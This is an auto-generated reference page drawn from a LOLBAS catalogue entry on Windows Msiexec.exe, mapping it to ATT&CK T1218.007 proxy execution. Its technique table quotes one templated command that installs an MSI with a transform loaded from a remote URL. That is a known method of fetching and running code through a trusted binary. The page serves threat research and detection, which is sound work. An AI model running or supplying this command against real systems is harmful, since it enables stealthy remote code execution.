---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Msiexec.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `msiexec.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Msiexec.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Used by Windows to execute msi files

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/msiexec.md)
- Source verification: [source record](../../sources/lolbas/msiexec.exe.md)

## Aliases

- `Msiexec.exe`
- `msiexec.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1218.007 - Msiexec](../../attack/techniques/T1218.007-msiexec.md) | explicit | source | Command metadata lists T1218.007: msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS="{REMOTEURL:.mst}" /qb |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/msiexec.exe.md)

## Source Verification

[source record](../../sources/lolbas/msiexec.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@netbiosX'
Person: netbiosX
- Handle: '@PhilipTsukerman'
Person: Philip Tsukerman
Author: Oddvar Moe
Commands:
- Category: Execute
```
